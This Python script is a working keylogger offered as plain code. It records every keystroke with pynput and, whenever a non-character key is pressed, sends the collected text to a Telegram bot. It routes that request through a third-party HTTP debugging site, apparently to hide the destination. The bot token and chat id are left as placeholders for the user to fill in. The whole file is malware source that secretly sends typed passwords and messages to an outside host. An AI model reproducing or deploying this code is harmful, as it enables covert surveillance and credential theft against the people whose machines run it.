import requests
from pynput import keyboard

def send_message(word):
    url = 'https://api.telegram.org/"your robot token"/sendmessage?chat_id="your chat id"&text='+word

    data = {'UrlBox':url,
        'AgentList':'Mozila Firefox',
        'VersionsList':'HTTP/1.1',
        'MethodList':'GET'
    }

    http_requests = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx' , data)

def listener():
    with keyboard.Listener(on_press= keyboard_log) as lstn:
        lstn.join()

list_of_words = []
def keyboard_log(key):
    
    final_string = ''

    try:
        key = key.char
        list_of_words.append(key)
    
    except:
        for i in list_of_words:
            final_string += i
        
        send_message(final_string)
        #print('this is final string:', final_string)
        list_of_words.clear()



listener()
keyboard_log(list_of_words)